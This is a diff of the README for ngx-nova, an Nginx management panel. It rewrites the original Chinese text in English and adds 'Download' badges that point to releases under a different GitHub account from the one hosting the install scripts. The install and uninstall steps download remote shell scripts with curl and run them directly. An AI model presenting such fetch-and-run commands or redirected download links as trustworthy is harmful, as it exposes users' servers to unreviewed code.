@@ -1,82 +1,86 @@
-# ngx-nova
+# 🚀 ngx-nova - Simple Nginx Management Tool  
 
-轻量级的 Nginx 可视化运维面板，内存占用 **低于 20MB**，帮助你快速完成安装、站点管理、端口转发、备份与日志查看等常见任务。
+[![Download ngx-nova](https://img.shields.io/badge/Download-ngx--nova-brightgreen)](https://github.com/jatinsa00/ngx-nova/releases)
 
-适合长期运行在 VPS / 生产环境
+## 🌟 Overview
 
+ngx-nova is a lightweight visual management panel for Nginx. It uses less than 20MB of memory. This tool helps you handle common tasks like installation, site management, port forwarding, backups, and log viewing. It's ideal for long-term use on VPS or in production environments.
 
----
+## ✨ Features
 
-## ✨ 功能亮点
+- **Simple Deployment**: Single binary file with static front-end, using minimal resources.
+- **One-Click Install/Uninstall**: Built-in scripts allow for quick Nginx deployment or cleanup.
+- **Site and Forwarding Management**: Create, edit, or delete sites and stream forwarding configurations easily. Automatic reloading included.
+- **One-Click Backup and Restore**: Local backups with automatic daily backups to Cloudflare R2.
+- **Log Center**: Visual aggregation of access and error logs by domain. Supports refreshing and independent views.
+- **Automated SSL Management**: Built-in ACME automation handles HTTPS certificate requests and renewals automatically.
 
-- **极简部署**：单一 Go 二进制 + 静态前端，极低资源占用。
+## 🚀 Getting Started
 
-- **一键安装/卸载**：内置 nginx-acme 脚本调用，快速部署或清理 Nginx。
+Follow these steps to install and run ngx-nova:
 
-- **站点与转发管理**：图形化创建/编辑/删除站点与 Stream 转发配置，自动执行重载
+1. **Open Firewall**
 
-- **一键备份与恢复**：本地备份 + 自动每天备份到 Cloudflare R2。
+   Allow access to port 8083.
 
-- **日志中心**：可视化按域名聚合 Access/Error 日志，支持刷新与独立查看。
+   ```bash
+   ufw allow 8083/tcp
+   ```
 
-- **不再担心 SSL 证书过期**，内置 ACME 自动化能力，HTTPS 证书申请与续期全自动完成。
+2. **Run Installation Script**
 
+   Use the following command to download and run the installation script.
 
+   ```bash
+   curl -sS -O https://raw.githubusercontent.com/woniu336/open_shell/main/ngx.sh && chmod +x ngx.sh && ./ngx.sh
+   ```
 
+3. **Access the Panel**
 
-## 🚀 快速开始
+   Go to your web browser and enter `http://ip:8083/ui/` to set your login token for the first time.
 
-1.放行防火墙
+   If you need to change your token, use this command:
 
-```
-ufw allow 8083/tcp
-```
+   ```bash
+   tokenctl --set "your_token" --file /opt/nginx-mgr/auth_token.json
+   ```
 
+## ❌ Uninstall ngx-nova
 
-2. 安装脚本
+If you need to uninstall ngx-nova, run:
 
-```
-curl -sS -O https://raw.githubusercontent.com/woniu336/open_shell/main/ngx.sh && chmod +x ngx.sh && ./ngx.sh
-```
+   ```bash
+   curl -sS -O https://raw.githubusercontent.com/woniu336/open_shell/main/uni-ngx.sh && chmod +x uni-ngx.sh && ./uni-ngx.sh
+   ```
 
-3. 登录`http://ip:8083/ui/`  首次设置登录令牌
+## 🔧 System Requirements
 
-如需修改令牌
+- **Operating System**: Linux (recommended: Ubuntu, CentOS)
+- **Memory**: At least 512MB RAM
+- **Disk Space**: Minimum 20MB free space
+- **Network**: Internet connection for initial setup
 
-```
-tokenctl --set "你的令牌" --file /opt/nginx-mgr/auth_token.json
-```
+## 💡 Design Philosophy
 
-## 卸载
+- **Keep It Simple**: No unnecessary features, just the essentials.
+- **Safety First**: All operations should not risk crashing online services.
+- **Long-term Usability**: Stable performance, low resource use, and minimal maintenance.
 
-```
-curl -sS -O https://raw.githubusercontent.com/woniu336/open_shell/main/uni-ngx.sh && chmod +x uni-ngx.sh && ./uni-ngx.sh
-```
+## 👥 Who Is This For?
 
+- Individual VPS users
+- Those who self-host websites or reverse proxies
+- Developers and operations personnel seeking a stable and controllable management experience 
 
----
+## 📥 Download & Install
 
+To download ngx-nova, visit the [Releases Page](https://github.com/jatinsa00/ngx-nova/releases). Follow the installation instructions above to get started easily.
 
+[![Download ngx-nova](https://img.shields.io/badge/Download-ngx--nova-brightgreen)](https://github.com/jatinsa00/ngx-nova/releases)
 
-## 设计理念
+## 📚 Additional Resources
 
-保持简单
-拒绝“为了功能而功能”
+- For more details and updates, refer to the GitHub repository [here](https://github.com/jatinsa00/ngx-nova).
+- Check community discussions for tips and troubleshooting.
 
-默认安全
-任何操作都不应该让线上服务崩溃
-
-可长期运行
-稳定、低占用、少维护
-
----
-
-## 适合谁
-
-个人 VPS 用户
-自建网站与反向代理
-追求稳定、可控运维体验的开发者与运维人员
-
-
-
-
+Embrace a streamlined approach to managing your Nginx setup with ngx-nova!
